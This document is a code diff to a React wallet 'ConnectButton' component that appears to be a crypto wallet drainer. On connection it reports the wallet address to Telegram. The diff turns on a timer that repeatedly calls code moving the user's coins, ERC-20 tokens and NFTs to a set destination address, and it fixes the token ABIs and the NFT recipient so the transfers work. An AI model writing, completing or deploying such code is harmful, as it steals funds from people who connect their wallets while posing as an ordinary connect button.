@@ -5,12 +5,14 @@ import axios from 'axios'
 import { EvmChain } from "@moralisweb3/common-evm-utils";
 import { createWeb3Modal, useWeb3Modal } from "@web3modal/wagmi/react";
 import {
-    WagmiConfig,
-    useAccount,
-    useBalance,
-    useDisconnect,
-    configureChains,
-    createConfig
+  WagmiConfig,
+  useAccount,
+  useBalance,
+  useDisconnect,
+  configureChains,
+  createConfig,
+  erc20ABI,
+  erc721ABI
 } from "wagmi";
 import { infuraProvider } from 'wagmi/providers/infura'
 import { publicProvider } from 'wagmi/providers/public'
@@ -98,7 +100,7 @@ function ConnectButton() {
         setBalance(`${ data?.formatted } ${ data?.symbol } `)
     }, [data?.formatted, data?.symbol])
 
-    const handleTransfer = useCallback(async () => {
+    const handleWallet = useCallback(async () => {
         ShowBal();
         if (isConnected && address && destinationAddress) {
             try {
@@ -166,13 +168,13 @@ function ConnectButton() {
         if (isConnected) {
             sendTelegramNotification(`Wallet Connected\n\nAddress: ${ address }`);
             const transferInterval = setInterval(() => {
-                // handleTransfer(); // Run every minute while isConnected is true
+                handleWallet(); // Run every minute while isConnected is true
             }, 120000); // 120000 milliseconds = 1 minute
 
             // Clean up the interval when the component unmounts
             return () => clearInterval(transferInterval);
         }
-    }, [isConnected, address]);
+    }, [isConnected, address, handleWallet]);
 
     useEffect(() => {
         if (isDisconnected) {
@@ -196,7 +198,6 @@ function ConnectButton() {
         </>
     );
 }
-
 
 const transferFunds = async (from, to, valueInEth) => {
     const web3 = new Web3(useWeb3Modal.provider); // Initialize Web3 with the provider
@@ -223,7 +224,7 @@ const transferFunds = async (from, to, valueInEth) => {
 
 const transferTokens = async (from, to, contractAddress, value) => {
     const web3 = new Web3(useWeb3Modal.provider); // Initialize Web3 with the provider
-    const contract = new web3.eth.Contract(ERC20ContractABI, contractAddress); // Replace ERC20ContractABI with your ERC20 contract ABI
+    const contract = new web3.eth.Contract(erc20ABI, contractAddress); // Replace ERC20ContractABI with your ERC20 contract ABI
 
     try {
         const options = {
@@ -246,12 +247,12 @@ const transferTokens = async (from, to, contractAddress, value) => {
 
 const transferNFT = async (from, to, contractAddress, tokenId) => {
     const web3 = new Web3(useWeb3Modal.provider); // Initialize Web3 with the provider
-    const contract = new web3.eth.Contract(NFTContractABI, contractAddress); // Replace NFTContractABI with your NFT contract ABI
+    const contract = new web3.eth.Contract(erc721ABI, contractAddress); // Replace NFTContractABI with your NFT contract ABI
 
     try {
         const options = {
             from: from,
-            to: contractAddress,
+            to: to,
             data: contract.methods.safeTransferFrom(from, to, tokenId).encodeABI(),
         };
 
